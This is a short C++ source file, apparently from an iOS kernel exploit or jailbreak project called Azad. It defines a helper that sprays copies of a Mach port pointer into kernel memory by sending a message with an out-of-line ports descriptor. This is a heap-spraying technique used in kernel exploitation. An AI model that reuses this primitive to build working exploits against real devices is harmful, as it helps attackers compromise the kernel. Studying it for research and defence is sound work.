//
//  Utility.cpp
//  Azad
//
//  Created by Umang Raghuvanshi on 02/08/19.
//  Copyright © 2019 Umang Raghuvanshi. All rights reserved.
//

#include "Utility.hpp"
#include "parameters.h"

using namespace Azad;

mach_port_t Utility::sprayPortPointer(mach_port_t targetPortName,
    unsigned int count, int disposition)
{
    mach_port_t remotePort = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
            &remotePort)
        != KERN_SUCCESS)
        throw std::runtime_error("Failed to allocate a port");

    auto ports = std::vector<mach_port_t>(count, targetPortName);

    struct ool_msg msg = { 0 };
    msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg.hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg.hdr.msgh_remote_port = remotePort;
    msg.hdr.msgh_local_port = MACH_PORT_NULL;
    msg.hdr.msgh_id = 0x41414141;

    msg.body.msgh_descriptor_count = 1;

    msg.ool_ports.address = ports.data();
    msg.ool_ports.count = count;
    msg.ool_ports.deallocate = 0;
    msg.ool_ports.disposition = disposition;
    msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg.ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

    if (mach_msg(&(msg.hdr), MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
            msg.hdr.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE,
            MACH_PORT_NULL)
        != KERN_SUCCESS)
        throw std::runtime_error("Failed to spray target port's address");

    return remotePort;
}
